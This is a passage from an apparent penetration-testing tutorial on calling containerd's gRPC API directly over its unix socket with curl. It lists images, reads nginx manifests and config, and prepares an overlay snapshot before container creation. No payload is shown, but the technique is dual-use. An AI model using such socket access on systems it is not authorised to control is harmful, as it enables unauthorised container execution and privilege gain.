      Input: DeleteImageRequest
      Output: Empty

==================================

[SNIP]
```


As we see from the above, the `List` operation involves sending `ListImagesRequest` messages and getting `ListImagesResponses` in response. The definitions for these messages from the output of the command above are like so:


```
* ListImagesRequest
  Fields:
      filters - string

  Rough JSON example (might need tweaking):

{
    "filters": "string"
}

==================================
* ListImagesResponse
  Fields:
      images - Image

  Rough JSON example (might need tweaking):

{
    "images": {"name": "string", "labels": "LabelsEntry", "target": "Descriptor", "created_at": "Timestamp", "updated_at": "Timestamp"}
}

[SNIP]
```

As with some of the previous examples, the `ListImagesRequest` message has a single input field `filters`, which can be left empty if we want to list all images, meaning we can use a empty message type as input again. The following command shows how to list images in the `k8s.io` namespace.


```
$ echo -ne "\x00\x00\x00\x00\x00" | sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc" -H "te: trailers"  -H "grpc-accept-encoding: gzip" -H "containerd-namespace: k8s.io" http://localhost/containerd.services.images.v1.Images/List --data-binary @- --output /tmp/listimagesresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55f7bd403ec0)
> POST /containerd.services.images.v1.Images/List HTTP/2
> Host: localhost
> user-agent: curl/7.81.0
> accept: */*
> content-type: application/grpc
> te: trailers
> grpc-accept-encoding: gzip
> containerd-namespace: k8s.io
> content-length: 5
>
} [5 bytes data]
* We are completely uploaded and fine
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
< HTTP/2 200
< content-type: application/grpc
<
{ [32727 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact

```

The response in file `/tmp/listimagesresponse.bin` is a `ListImagesResponse`, and we can parse it and check for `nginx` images as we did in the `ctr` example above like so:

```
$ ./protobuf_parser.py -m images_pb2.py -d /tmp/listimagesresponse.bin -t ListImagesResponse | grep nginx
  name: "docker.io/library/nginx:1.14.2"
  name: "docker.io/library/nginx@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755"
  name: "docker.io/library/nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d"

[SNIP]
```

We have the image identifier for our nginx image `docker.io/library/nginx:1.14.2`.


Now we want to get the image details. From the previous services listing for the Image service above, we can see the `Get` operation involves sending `GetImageRequest` messages and getting `GetImageResponse` in response. The definitions for these messages from the output of the command above are like so:

```
==================================
* GetImageRequest
  Fields:
      name - string

  Rough JSON example (might need tweaking):

{
    "name": "string"
}

==================================
* GetImageResponse
  Fields:
      image - Image

  Rough JSON example (might need tweaking):

{
    "image": {"name": "string", "labels": "LabelsEntry", "target": "Descriptor", "created_at": "Timestamp", "updated_at": "Timestamp"}
}

```

In this case we actually need to send a protobuf message with some content in it. We can create one from a JSON template using the protobuf_parser.py tool like so.

```
$ cat getimage.json
{"name": "docker.io/library/nginx:1.14.2"}
$ ./protobuf_parser.py -m images_pb2.py -t GetImageRequest -i getimage.json -o /tmp/getimage.bin
Written to /tmp/getimage.bin
```

The message has been encoded into a protobuf binary format in file `/tmp/getimage.bin`. We can either read this directly from its file with curl (shown below) or we could hexlify it and pipe it to curl using the echo command after encoding it (a tool to do this is available [here](https://github.com/stephenbradshaw/pentesting_stuff/blob/master/containerd/echoer.py) if needed). 

```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.images.v1.Images/Get --data-binary @/tmp/getimage.bin --output /tmp/getimageresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x561c6e1d7eb0)
> POST /containerd.services.images.v1.Images/Get HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 37
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [37 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [242 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```

The `GetImageResponse` formated response is in file `/tmp/getimageresponse.bin` as created by curl in the command above. We can parse it like so.

```
$ ./protobuf_parser.py -m images_pb2.py -d /tmp/getimageresponse.bin -t GetImageResponse
image {
  name: "docker.io/library/nginx:1.14.2"
  labels {
    key: "io.cri-containerd.image"
    value: "managed"
  }
  target {
    media_type: "application/vnd.docker.distribution.manifest.list.v2+json"
    digest: "sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d"
    size: 2029
  }
  created_at {
    seconds: 1697590445
    nanos: 454204347
  }
  updated_at {
    seconds: 1697590450
    nanos: 558546668
  }
}
```

This gives us a manifest list for this image, which is a list of a number of manifests

We next need to get some information about the content of the manifest list now, for which we can use the [content protocol definition file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/content/v1/content.proto). 

The services associated with this API are as follows.


```
$ ./protobuf_parser.py -m content_pb2.py
Services:
* /containerd.services.content.v1.Content/Info
      Input: InfoRequest
      Output: InfoResponse
* /containerd.services.content.v1.Content/Update
      Input: UpdateRequest
      Output: UpdateResponse
* /containerd.services.content.v1.Content/List
      Input: ListContentRequest
      Output: ListContentResponse
* /containerd.services.content.v1.Content/Delete
      Input: DeleteContentRequest
      Output: Empty
* /containerd.services.content.v1.Content/Read
      Input: ReadContentRequest
      Output: ReadContentResponse
* /containerd.services.content.v1.Content/Status
      Input: StatusRequest
      Output: StatusResponse
* /containerd.services.content.v1.Content/ListStatuses
      Input: ListStatusesRequest
      Output: ListStatusesResponse
* /containerd.services.content.v1.Content/Write
      Input: WriteContentRequest
      Output: WriteContentResponse
* /containerd.services.content.v1.Content/Abort
      Input: AbortRequest
      Output: Empty
```


To get the content of the manifest list we are interested in the `/containerd.services.content.v1.Content/Read` service, which uses the `ReadContentRequest` and `ReadContentResponse`



```
==================================
* ReadContentRequest
  Fields:
      digest - string
      offset - int64
      size - int64

  Rough JSON example (might need tweaking):

{
    "digest": "string",
    "offset": int64,
    "size": int64
}

==================================
* ReadContentResponse
  Fields:
      offset - int64
      data - string

  Rough JSON example (might need tweaking):

{
    "offset": int64,
    "data": "string"
}

```


"sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d"
  size: 2029



```
$ cat readcontentrequest.json
{"digest": "sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d", "size": 2029}
$ ./protobuf_parser.py -m content_pb2.py -t ReadContentRequest -i readcontentrequest.json -o readcontentrequest.bin
Written to readcontentrequest.bin
```



```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.content.v1.Content/Read --data-binary @readcontentrequest.bin --output readcontentresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55ec533d1eb0)
> POST /containerd.services.content.v1.Content/Read HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 81
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [81 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [2037 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```

Parse the response 

```
$ ./protobuf_parser.py -m content_pb2.py -t ReadContentResponse -d readcontentresponse.bin
data: "{\n   "schemaVersion": 2,\n   "mediaType": "application/vnd.docker.distribution.manifest.list.v2+json",\n   "manifests": [\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078",\n         "platform": {\n            "architecture": "amd64",\n            "os": "linux"\n         }\n      },\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:17a1998407746106c307c58c5089569bc1d0728567657b8c19ccffd0497c91ba",\n         "platform": {\n            "architecture": "arm",\n            "os": "linux",\n            "variant": "v7"\n         }\n      },\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:d58b3e481b8588c080b42e5d7427f2c2061decbf9194f06e2adce641822e282a",\n         "platform": {\n            "architecture": "arm64",\n            "os": "linux",\n            "variant": "v8"\n         }\n      },\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:de4556bb2971a581b6ce23bcbfd3dbef6ee1640839d2c88b3e846a4e101f363c",\n         "platform": {\n            "architecture": "386",\n            "os": "linux"\n         }\n      },\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:750c35f5051eebd0d1a2faa08a29d3eabd330c8cf0350b57353d205a99c47176",\n         "platform": {\n            "architecture": "ppc64le",\n            "os": "linux"\n         }\n      },\n      {\n         "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n         "size": 948,\n         "digest": "sha256:e76ff864168bca4ef1a53cfaf5fb4981cdb2810385b4b4edc19fd94a5d04eb38",\n         "platform": {\n            "architecture": "s390x",\n            "os": "linux"\n         }\n      }\n   ]\n}"
```


The response is a list of manifests. We want the one that matches the architecture of the current system, in this case we want the `amd64` one, which is the manifest with identifier `sha256:706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078` with size `948`. We now craft up another request to get the container image details from this manifest.


```
$ cat readcontentrequest2.json
{"digest": "sha256:706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078", "size": 948}
$ ./protobuf_parser.py -m content_pb2.py -t ReadContentRequest -i readcontentrequest2.json -o readcontentrequest2.bin
Written to readcontentrequest2.bin
```

Send the request.

```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.content.v1.Content/Read --data-binary @readcontentrequest2.bin --output readcontentresponse2.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x562fb0428eb0)
> POST /containerd.services.content.v1.Content/Read HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 81
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [81 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [956 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```

Parse the response.


```
$ ./protobuf_parser.py -m content_pb2.py -t ReadContentResponse -d readcontentresponse2.bin
data: "{\n   "schemaVersion": 2,\n   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",\n   "config": {\n      "mediaType": "application/vnd.docker.container.image.v1+json",\n      "size": 6003,\n      "digest": "sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369"\n   },\n   "layers": [\n      {\n         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",\n         "size": 22496048,\n         "digest": "sha256:27833a3ba0a545deda33bb01eaf95a14d05d43bf30bce9267d92d17f069fe897"\n      },\n      {\n         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",\n         "size": 22204973,\n         "digest": "sha256:0f23e58bd0b7c74311703e20c21c690a6847e62240ed456f8821f4c067d3659b"\n      },\n      {\n         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",\n         "size": 203,\n         "digest": "sha256:8ca774778e858d3f97d9ec1bec1de879ac5e10096856dc22ed325a3ad944f78a"\n      }\n   ]\n}"

```

From this we want to get the container image identifier. It has this identifier `sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369` and a size of 6003.


We need to do an `/containerd.services.content.v1.Content/Info` request to get the snapshot uid for this container. This API call uses the `InfoRequest` and `InfoResponse` messages, which we can get the details for from the parsing of the `content.proto` file that we performed earlier by running `./protobuf_parser.py -m content_pb2.py`. The relevent output from the command is as follows:


```
==================================
* InfoRequest
  Fields:
      digest - string

  Rough JSON example (might need tweaking):

{
    "digest": "string"
}

==================================
* InfoResponse
  Fields:
      info - Info

  Rough JSON example (might need tweaking):

{
    "info": {"digest": "string", "size": "int64", "created_at": "Timestamp", "updated_at": "Timestamp", "labels": "LabelsEntry"}
}
```

Lets create an `InfoRequest` request for the container image we identified above.


```
$ cat inforequest.json
{"digest": "sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369"}
$ ./protobuf_parser.py -m content_pb2.py -t InfoRequest -i inforequest.json -o inforequest.bin
Written to inforequest.bin
```

Now send the request.

```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.content.v1.Content/Info --data-binary @inforequest.bin --output inforesponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55ca70ebaeb0)
> POST /containerd.services.content.v1.Content/Info HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 78
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [78 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [290 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```

Now lets parse the response so we can get the snapshot overlay

```
$ ./protobuf_parser.py -m content_pb2.py -t InfoResponse -d inforesponse.bin
info {
  digest: "sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369"
  size: 6003
  created_at {
    seconds: 1697590436
    nanos: 851140635
  }
  updated_at {
    seconds: 1697590450
    nanos: 555865938
  }
  labels {
    key: "containerd.io/gc.ref.snapshot.overlayfs"
    value: "sha256:19606512dfe192788a55d7c1efb9ec02041b4e318587632f755c5112f927e0e3"
  }
  labels {
    key: "containerd.io/distribution.source.docker.io"
    value: "library/nginx"
  }
}
```

From the above, the identifier of the overlay snapshot identifier is `sha256:19606512dfe192788a55d7c1efb9ec02041b4e318587632f755c5112f927e0e3`. We will use this in the moment to create a snapshot 


We also want to get some details about the image itself for use when we create the container - we can do this using the `/containerd.services.content.v1.Content/Read` API call, which uses `ReadContentRequest` and `ReadContentResponse` messages.

These look like the following:

```

* ReadContentRequest
  Fields:
      digest - string
      offset - int64
      size - int64

  Rough JSON example (might need tweaking):

{
    "digest": "string",
    "offset": int64,
    "size": int64
}

==================================
* ReadContentResponse
  Fields:
      offset - int64
      data - string

  Rough JSON example (might need tweaking):

{
    "offset": int64,
    "data": "string"
}

```

Lets create a message 

```
$ cat readcontentrequest.json
{"digest": "sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369", "size": 6003}
$ ./protobuf_parser.py -m content_pb2.py -i readcontentrequest.json -o readcontentrequest.bin -t ReadContentRequest
Written to readcontentrequest.bin
```

Make the request.

```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.content.v1.Content/Read --data-binary @readcontentrequest.bin --output readcontentresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x5594f4dd9eb0)
> POST /containerd.services.content.v1.Content/Read HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 81
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [81 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [6011 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```

Now lets look at the response:

```
$ ./protobuf_parser.py -m content_pb2.py -d readcontentresponse.bin -t ReadContentResponse
data: "{"architecture":"amd64","config":{"Hostname":"","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"80/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","NGINX_VERSION=1.14.2-1~stretch","NJS_VERSION=1.14.2.0.2.6-1~stretch"],"Cmd":["nginx","-g","daemon off;"],"ArgsEscaped":true,"Image":"sha256:ac539667b75fa925232b8dbbfdfb8adb98007c44e11a5fbd4001916c0fcc0bd4","Volumes":null,"WorkingDir":"","Entrypoint":null,"OnBuild":null,"Labels":{"maintainer":"NGINX Docker Maintainers \u003cdocker-maint@nginx.com\u003e"},"StopSignal":"SIGTERM"},"container":"5e8d96e0fb01832974f0680a9aff2fbadc37fcf30447ae30e19f59b926672041","container_config":{"Hostname":"5e8d96e0fb01","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"80/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","NGINX_VERSION=1.14.2-1~stretch","NJS_VERSION=1.14.2.0.2.6-1~stretch"],"Cmd":["/bin/sh","-c","#(nop) ","CMD [\"nginx\" \"-g\" \"daemon off;\"]"],"ArgsEscaped":true,"Image":"sha256:ac539667b75fa925232b8dbbfdfb8adb98007c44e11a5fbd4001916c0fcc0bd4","Volumes":null,"WorkingDir":"","Entrypoint":null,"OnBuild":null,"Labels":{"maintainer":"NGINX Docker Maintainers \u003cdocker-maint@nginx.com\u003e"},"StopSignal":"SIGTERM"},"created":"2019-03-26T23:14:52.227945051Z","docker_version":"18.06.1-ce","history":[{"created":"2019-03-26T22:41:26.106246179Z","created_by":"/bin/sh -c #(nop) ADD file:4fc310c0cb879c876c5c0f571af665a0d24d36cb9263e0f53b0cda2f7e4b1844 in / "},{"created":"2019-03-26T22:41:26.302497847Z","created_by":"/bin/sh -c #(nop)  CMD [\"bash\"]","empty_layer":true},{"created":"2019-03-26T23:13:16.970741082Z","created_by":"/bin/sh -c #(nop)  LABEL maintainer=NGINX Docker Maintainers \u003cdocker-maint@nginx.com\u003e","empty_layer":true},{"created":"2019-03-26T23:14:26.130250839Z","created_by":"/bin/sh -c #(nop)  ENV NGINX_VERSION=1.14.2-1~stretch","empty_layer":true},{"created":"2019-03-26T23:14:26.292539689Z","created_by":"/bin/sh -c #(nop)  ENV NJS_VERSION=1.14.2.0.2.6-1~stretch","empty_layer":true},{"created":"2019-03-26T23:14:50.851725507Z","created_by":"/bin/sh -c set -x \t\u0026\u0026 apt-get update \t\u0026\u0026 apt-get install --no-install-recommends --no-install-suggests -y gnupg1 apt-transport-https ca-certificates \t\u0026\u0026 \tNGINX_GPGKEY=573BFD6B3D8FBC641079A6ABABF5BD827BD9BF62; \tfound=''; \tfor server in \t\tha.pool.sks-keyservers.net \t\thkp://keyserver.ubuntu.com:80 \t\thkp://p80.pool.sks-keyservers.net:80 \t\tpgp.mit.edu \t; do \t\techo \"Fetching GPG key $NGINX_GPGKEY from $server\"; \t\tapt-key adv --keyserver \"$server\" --keyserver-options timeout=10 --recv-keys \"$NGINX_GPGKEY\" \u0026\u0026 found=yes \u0026\u0026 break; \tdone; \ttest -z \"$found\" \u0026\u0026 echo \u003e\u00262 \"error: failed to fetch GPG key $NGINX_GPGKEY\" \u0026\u0026 exit 1; \tapt-get remove --purge --auto-remove -y gnupg1 \u0026\u0026 rm -rf /var/lib/apt/lists/* \t\u0026\u0026 dpkgArch=\"$(dpkg --print-architecture)\" \t\u0026\u0026 nginxPackages=\" \t\tnginx=${NGINX_VERSION} \t\tnginx-module-xslt=${NGINX_VERSION} \t\tnginx-module-geoip=${NGINX_VERSION} \t\tnginx-module-image-filter=${NGINX_VERSION} \t\tnginx-module-njs=${NJS_VERSION} \t\" \t\u0026\u0026 case \"$dpkgArch\" in \t\tamd64|i386) \t\t\techo \"deb https://nginx.org/packages/debian/ stretch nginx\" \u003e\u003e /etc/apt/sources.list.d/nginx.list \t\t\t\u0026\u0026 apt-get update \t\t\t;; \t\t*) \t\t\techo \"deb-src https://nginx.org/packages/debian/ stretch nginx\" \u003e\u003e /etc/apt/sources.list.d/nginx.list \t\t\t\t\t\t\u0026\u0026 tempDir=\"$(mktemp -d)\" \t\t\t\u0026\u0026 chmod 777 \"$tempDir\" \t\t\t\t\t\t\u0026\u0026 savedAptMark=\"$(apt-mark showmanual)\" \t\t\t\t\t\t\u0026\u0026 apt-get update \t\t\t\u0026\u0026 apt-get build-dep -y $nginxPackages \t\t\t\u0026\u0026 ( \t\t\t\tcd \"$tempDir\" \t\t\t\t\u0026\u0026 DEB_BUILD_OPTIONS=\"nocheck parallel=$(nproc)\" \t\t\t\t\tapt-get source --compile $nginxPackages \t\t\t) \t\t\t\t\t\t\u0026\u0026 apt-mark showmanual | xargs apt-mark auto \u003e /dev/null \t\t\t\u0026\u0026 { [ -z \"$savedAptMark\" ] || apt-mark manual $savedAptMark; } \t\t\t\t\t\t\u0026\u0026 ls -lAFh \"$tempDir\" \t\t\t\u0026\u0026 ( cd \"$tempDir\" \u0026\u0026 dpkg-scanpackages . \u003e Packages ) \t\t\t\u0026\u0026 grep '^Package: ' \"$tempDir/Packages\" \t\t\t\u0026\u0026 echo \"deb [ trusted=yes ] file://$tempDir ./\" \u003e /etc/apt/sources.list.d/temp.list \t\t\t\u0026\u0026 apt-get -o Acquire::GzipIndexes=false update \t\t\t;; \tesac \t\t\u0026\u0026 apt-get install --no-install-recommends --no-install-suggests -y \t\t\t\t\t\t$nginxPackages \t\t\t\t\t\tgettext-base \t\u0026\u0026 apt-get remove --purge --auto-remove -y apt-transport-https ca-certificates \u0026\u0026 rm -rf /var/lib/apt/lists/* /etc/apt/sources.list.d/nginx.list \t\t\u0026\u0026 if [ -n \"$tempDir\" ]; then \t\tapt-get purge -y --auto-remove \t\t\u0026\u0026 rm -rf \"$tempDir\" /etc/apt/sources.list.d/temp.list; \tfi"},{"created":"2019-03-26T23:14:51.711682497Z","created_by":"/bin/sh -c ln -sf /dev/stdout /var/log/nginx/access.log \t\u0026\u0026 ln -sf /dev/stderr /var/log/nginx/error.log"},{"created":"2019-03-26T23:14:51.894981136Z","created_by":"/bin/sh -c #(nop)  EXPOSE 80","empty_layer":true},{"created":"2019-03-26T23:14:52.059858592Z","created_by":"/bin/sh -c #(nop)  STOPSIGNAL SIGTERM","empty_layer":true},{"created":"2019-03-26T23:14:52.227945051Z","created_by":"/bin/sh -c #(nop)  CMD [\"nginx\" \"-g\" \"daemon off;\"]","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:5dacd731af1b0386ead06c8b1feff9f65d9e0bdfec032d2cd0bc03690698feda","sha256:b8f18c3b860b067be09836beadd676a0aa1e784ec28cf730986859b4146c344a","sha256:82ae01d5004e2143b642b1a008624e7521c73ab18e5776a22f18a172b9dbec80"]}}"

```

Theres is information here that we will use when we create our container spec later on `args` from the `Cmd` value and `env` from `Env` and some label values.



Now, using this, we need to create a snapshot for the containers storage . The [snapshot protocol definition file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/snapshots/v1/snapshots.proto) can be used to view services relating to snapshots. It has a dependency on the [mount.proto](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/types/mount.proto) definition so make sure you process this first as previously discussed.


These are the services supported in the protocol definition:

```
$ ./protobuf_parser.py -m snapshots_pb2.py
Services:
* /containerd.services.snapshots.v1.Snapshots/Prepare
      Input: PrepareSnapshotRequest
      Output: PrepareSnapshotResponse
* /containerd.services.snapshots.v1.Snapshots/View
      Input: ViewSnapshotRequest
      Output: ViewSnapshotResponse
* /containerd.services.snapshots.v1.Snapshots/Mounts
      Input: MountsRequest
      Output: MountsResponse
* /containerd.services.snapshots.v1.Snapshots/Commit
      Input: CommitSnapshotRequest
      Output: Empty
* /containerd.services.snapshots.v1.Snapshots/Remove
      Input: RemoveSnapshotRequest
      Output: Empty
* /containerd.services.snapshots.v1.Snapshots/Stat
      Input: StatSnapshotRequest
      Output: StatSnapshotResponse
* /containerd.services.snapshots.v1.Snapshots/Update
      Input: UpdateSnapshotRequest
      Output: UpdateSnapshotResponse
* /containerd.services.snapshots.v1.Snapshots/List
      Input: ListSnapshotsRequest
      Output: ListSnapshotsResponse
* /containerd.services.snapshots.v1.Snapshots/Usage
      Input: UsageRequest
      Output: UsageResponse
* /containerd.services.snapshots.v1.Snapshots/Cleanup
      Input: CleanupRequest
      Output: Empty
```


We want to create a snapshot, for which we use the `/containerd.services.snapshots.v1.Snapshots/Prepare` api, which uses the `PrepareSnapshotRequest` and `PrepareSnapshotResponse` messages.

These look like the following:

```
* PrepareSnapshotRequest
  Fields:
      snapshotter - string
      key - string
      parent - string
      labels - LabelsEntry

  Rough JSON example (might need tweaking):

{
    "snapshotter": "string",
    "key": "string",
    "parent": "string",
    "labels": LabelsEntry
}

==================================
* PrepareSnapshotResponse
  Fields:
      mounts - Mount

  Rough JSON example (might need tweaking):

{
    "mounts": {"type": "string", "source": "string", "target": "string", "options": "string"}
}

```

Create a snapshot request like so:

```
$ cat preparesnapshotrequest.json
{"snapshotter": "overlayfs", "key": "nginx", "parent": "sha256:19606512dfe192788a55d7c1efb9ec02041b4e318587632f755c5112f927e0e3"}
$ ./protobuf_parser.py -m snapshots_pb2.py -i preparesnapshotrequest.json -o preparesnapshotrequest.bin -t PrepareSnapshotRequest
Written to preparesnapshotrequest.bin
```


Send the request
```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.snapshots.v1.Snapshots/Prepare --data-binary @preparesnapshotrequest.bin --output preparesnapshotresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55faed8d7eb0)
> POST /containerd.services.snapshots.v1.Snapshots/Prepare HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 96
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [96 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [453 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```


Now lets parse the response:

```
$ ./protobuf_parser.py -m snapshots_pb2.py -t PrepareSnapshotResponse -d preparesnapshotresponse.bin
mounts {
  type: "overlay"
  source: "overlay"
  options: "index=off"
  options: "workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45575/work"
  options: "upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45575/fs"
  options: "lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/290/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/289/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/288/fs"
}

```

This gives us information that we will use when we create the task.


Now we want to create a container. The [container protocol definition file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/containers/v1/containers.proto) can be used to view services relating to containers. 

The list of services provided is as follows:

```
$ ./protobuf_parser.py -m containers_pb2.py
Services:
